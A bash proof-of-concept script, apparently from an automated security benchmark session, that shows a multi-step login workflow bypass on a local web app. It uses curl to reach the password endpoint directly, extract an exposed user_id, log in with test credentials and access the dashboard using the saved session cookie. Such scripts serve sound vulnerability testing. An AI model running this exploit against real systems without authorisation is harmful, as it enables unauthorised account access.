#!/bin/bash
# POC: Demonstrates multi-step workflow bypass where password endpoint is directly accessible without completing username submission step
# Target: ./repo
# Created: 2025-11-07T18:52:22.724Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# Multi-step Workflow Bypass POC
# Tests whether /password/{username} endpoint is directly accessible 
# without completing the username submission step

TARGET_HOST="${1:-localhost:5000}"
TEST_USERNAME="test"

echo "[*] Multi-step Workflow Bypass POC"
echo "[*] Target: http://$TARGET_HOST"
echo ""

# Step 1: Test direct access to password endpoint (should be blocked but isn't)
echo "[+] Step 1: Testing direct access to /password/$TEST_USERNAME endpoint"
echo "[*] Expected: 302 redirect to / (workflow not completed)"
echo "[*] Actual: Should get HTTP 200 with password form (indicating vulnerability)"
echo ""

RESPONSE=$(curl -s -i "http://$TARGET_HOST/password/$TEST_USERNAME" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -20)

echo "Response code: $HTTP_CODE"
echo "Response body (last 20 lines):"
echo "$BODY"
echo ""

# Check if password form is present (vulnerability indicator)
if echo "$RESPONSE" | grep -q "type=\"password\""; then
    echo "[!] VULNERABILITY CONFIRMED: Password form is directly accessible"
    echo "[!] The endpoint returns HTTP 200 with password form"
    echo ""
else
    echo "[-] No password form found in response"
fi

# Check for username field (hidden field exposure)
if echo "$RESPONSE" | grep -q "value=\"$TEST_USERNAME\""; then
    echo "[!] Hidden username field found in form: value=\"$TEST_USERNAME\""
    echo ""
fi

# Check for user_id field (sensitive information exposure)
if echo "$RESPONSE" | grep -q "user_id"; then
    echo "[!] Sensitive user_id field exposed in form"
    USER_ID=$(echo "$RESPONSE" | grep "user_id" | grep -oP 'value="\K[^"]+' | head -1)
    echo "[!] user_id value: $USER_ID"
    echo ""
fi

# Step 2: Test that normal workflow also leads to password endpoint
echo "[+] Step 2: Testing normal workflow (username submission)"
echo "[*] Submitting username: $TEST_USERNAME"
echo ""

# Create a session by submitting username to /
RESPONSE=$(curl -s -i -X POST "http://$TARGET_HOST/" \
    -d "username=$TEST_USERNAME" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')

echo "Response code: $HTTP_CODE"
echo "Redirect location: $LOCATION"
echo ""

if [[ "$LOCATION" == *"/password/"* ]]; then
    echo "[+] Normal workflow redirects to password endpoint as expected"
    echo ""
fi

# Step 3: Compare - direct access vs. normal flow (both should work)
echo "[+] Step 3: Bypass Demonstration"
echo "[*] Both direct access (/password/$TEST_USERNAME) and normal flow"
echo "[*] lead to the same password form, proving workflow can be bypassed"
echo ""

# Step 4: Test that password submission works via direct access
echo "[+] Step 4: Testing password submission via direct bypass"
echo "[*] Attempting login with username=$TEST_USERNAME, password=test"
echo ""

# First, get the form without going through username step (bypass)
RESPONSE=$(curl -s -c /tmp/cookies_bypass.txt "http://$TARGET_HOST/password/$TEST_USERNAME")
USER_ID=$(echo "$RESPONSE" | grep "user_id" | grep -oP 'value="\K[^"]+' | head -1)

echo "[*] Extracted user_id from direct access: $USER_ID"
echo ""

# Submit password using the direct access
RESPONSE=$(curl -s -i -b /tmp/cookies_bypass.txt -c /tmp/cookies_result.txt \
    -X POST "http://$TARGET_HOST/password/$TEST_USERNAME" \
    -d "username=$TEST_USERNAME&user_id=$USER_ID&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP" | head -1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "Location:" | awk '{print $2}' | tr -d '\r')
SET_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | head -1)

echo "Response code: $HTTP_CODE"
echo "Redirect location: $LOCATION"
echo ""

if [[ "$HTTP_CODE" == "302" ]] && [[ "$LOCATION" == *"dashboard"* ]]; then
    echo "[!] VULNERABILITY CONFIRMED: Authentication successful via direct access"
    echo "[!] Workflow bypassed - password form was accessible without username step"
    echo "[!] Session created via direct endpoint access"
    echo ""
    
    # Check for session cookie
    if [[ ! -z "$SET_COOKIE" ]]; then
        echo "[!] Session cookie set: $SET_COOKIE"
    fi
    
    # Test that authenticated session works
    SESSION_COOKIE=$(grep "session" /tmp/cookies_result.txt | awk '{print $NF}')
    if [[ ! -z "$SESSION_COOKIE" ]]; then
        echo "[+] Testing authenticated access with session cookie..."
        DASHBOARD_RESPONSE=$(curl -s -b /tmp/cookies_result.txt "http://$TARGET_HOST/dashboard" 2>&1)
        if echo "$DASHBOARD_RESPONSE" | grep -q "Dashboard\|Orders\|Logout"; then
            echo "[!] Successfully authenticated and accessed dashboard"
            echo "[!] Confirms workflow bypass allows full authentication"
        fi
    fi
fi

echo ""
echo "[*] POC Complete"
echo "[*] Conclusion: The /password/{username} endpoint is directly accessible"
echo "[*] without completing the username submission step, allowing workflow bypass"

# Cleanup
rm -f /tmp/cookies_bypass.txt /tmp/cookies_result.txt